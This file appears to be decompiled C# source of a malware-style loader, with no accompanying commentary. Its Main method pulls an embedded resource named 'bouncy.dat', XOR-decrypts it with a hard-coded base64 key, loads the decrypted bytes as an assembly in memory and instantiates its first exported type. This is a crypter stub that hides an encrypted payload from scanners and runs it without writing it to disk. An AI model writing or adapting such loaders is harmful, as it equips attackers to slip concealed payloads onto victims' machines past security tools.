﻿using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Resources;

namespace Loader
{
	// Token: 0x02000002 RID: 2
	internal static class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		[STAThread]
		private static void Main()
		{
			byte[] array = (byte[])Program.GetResource("industrial.resources", "bouncy.dat");
			byte[] array2 = Convert.FromBase64String("Qt8l1qiIkqkBmg9Fya34FTQYcQ==");
			for (int i = 0; i < array.Length; i++)
			{
				array[i] ^= array2[i % array2.Length];
			}
			Activator.CreateInstance(Assembly.Load(array).GetExportedTypes()[0], new object[] { typeof(Program) });
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000020C4 File Offset: 0x000002C4
		private static object GetResource(string name, string key)
		{
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			using (Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name))
			{
				using (ResourceReader resourceReader = new ResourceReader(manifestResourceStream))
				{
					IDictionaryEnumerator enumerator = resourceReader.GetEnumerator();
					while (enumerator.MoveNext())
					{
						if (enumerator.Key is string && (string)enumerator.Key == key)
						{
							return enumerator.Value;
						}
					}
				}
			}
			throw new Exception();
		}
	}
}
